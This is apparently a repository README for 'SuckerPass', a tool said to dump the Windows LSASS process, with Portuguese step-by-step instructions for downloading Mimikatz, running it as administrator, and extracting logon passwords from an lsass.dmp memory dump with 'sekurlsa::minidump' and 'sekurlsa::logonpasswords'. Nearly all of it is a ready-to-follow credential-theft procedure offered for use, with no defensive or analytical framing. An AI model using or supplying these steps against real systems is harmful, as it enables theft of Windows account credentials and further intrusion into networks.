# SuckerPass
SuckerPass is a tool that dumps the LSASS process on Windows.

![SuckerPass Logo](img/Sucker.PNG)

## Instruções para Usar Mimikatz

1. **Download do Mimikatz:**
   - Faça o download da última versão do Mimikatz [aqui](https://github.com/ParrotSec/mimikatz/raw/master/Win32/mimikatz.exe).

2. **Executar o Mimikatz como Administrador:**
   - Abra um terminal ou prompt de comando como administrador.

3. **Executar os Seguintes Comandos:**
   - Navegue até o diretório onde o Mimikatz foi baixado.
   - Execute o Mimikatz como administrador.
     ```bash
     cd caminho\para\o\diretorio\do\mimikatz
     .\mimikatz.exe
     ```

   - Dentro do Mimikatz, use os comandos apropriados para suas necessidades. Por exemplo:
     ```plaintext
     mimikatz # sekurlsa::minidump c:\caminho\do\arquivo\dump\lsass.dmp
     mimikatz # sekurlsa::logonpasswords
     ```
